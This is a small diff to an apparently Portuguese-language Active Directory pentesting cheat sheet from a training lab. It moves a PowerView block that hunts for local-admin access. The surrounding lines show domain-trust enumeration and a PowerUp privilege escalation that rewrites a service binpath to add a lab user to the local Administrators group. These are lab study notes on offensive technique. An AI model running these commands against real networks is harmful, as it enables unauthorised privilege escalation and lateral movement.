@@ -2599,11 +2599,6 @@ Get-NetForestDomain -Forest eurocorp.local
 Get-NetForestDomain -Forest eurocorp.local -Verbose
 Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
 ```
-##### POWERVIEW OLD - HUNT / ENCONTRAR LOCAIS ONDE O USUARIO SEJA LOCAL ADMIN
-```
-Find-LocalAdminAccess -Verbose
-Find-LocalAdminAccess -Domain tech.local
-```
 ##### POWERVIEW OLD - TENTAR EFETUAR A ELEVAÇÃO DE PRIVILEGIO LOCALMENtE
 ```
 Import-Module .\PowerUp.ps1
@@ -2621,4 +2616,9 @@ net localgroup Administrators dcorp\student209 /add
 sc stop AbyssWebServer 
 sc config AbyssWebServer binpath= "net localgroup administrators dcrorp\student209 /add" 1>NUL
 sc start AbyssWebServer 
+```
+##### POWERVIEW OLD - HUNT / ENCONTRAR LOCAIS ONDE O USUARIO SEJA LOCAL ADMIN
+```
+Find-LocalAdminAccess -Verbose
+Find-LocalAdminAccess -Domain tech.local
 ```
